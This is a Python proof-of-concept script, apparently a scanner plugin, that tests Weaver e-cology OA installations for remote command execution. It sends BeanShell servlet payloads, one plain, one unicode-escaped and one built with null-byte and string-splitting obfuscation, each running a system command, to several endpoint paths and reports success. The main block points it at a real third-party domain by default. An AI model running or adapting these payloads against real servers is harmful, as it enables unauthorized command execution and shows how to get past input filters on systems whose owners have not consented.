#/usr/bin/python3

'''
name: 泛微-OA漏洞
description: 泛微-OA漏洞可执行任意命令
'''

import sys
import urllib3
from app.lib.utils.request import request


class Weaver_Ecology_Oa_Rce_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'Content-Length': '578'
        }

    def run(self):
        Url_Payload1="/bsh.servlet.BshServlet"
        Url_Payload2="/weaver/bsh.servlet.BshServlet"
        Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
        Url_Payload4="/oa/bsh.servlet.BshServlet"
        Data_Payload1="""bsh.script=exec("whoami");&bsh.servlet.output=raw"""
        Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
        Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
        for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4):
            url= self.url + Url_Payload
            for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): 
                try:
                    http_response = request.post(url, data = Data_payload, headers = self.headers)
                    #print http_response.status_code
                    if http_response.status_code == 200:
                        if ";</script>" not in (http_response.content):
                            if "Login.jsp" not in (http_response.content):
                                if "Error" not in (http_response.content):
                                    print("存在E-cologyOA_RCE Vulnerability")
                                    #print("Server Current Username：{0}".format(http_response.content))
                                    return True
                except Exception as e:
                    #print(e)
                    pass
        print("不存在E-cologyOA_RCE Vulnerability")
        return False

if __name__ == '__main__':
    Weaver_Ecology_OA_Rce = Weaver_Ecology_Oa_Rce_BaseVerify('https://www.baidu.com')
    Weaver_Ecology_OA_Rce.run()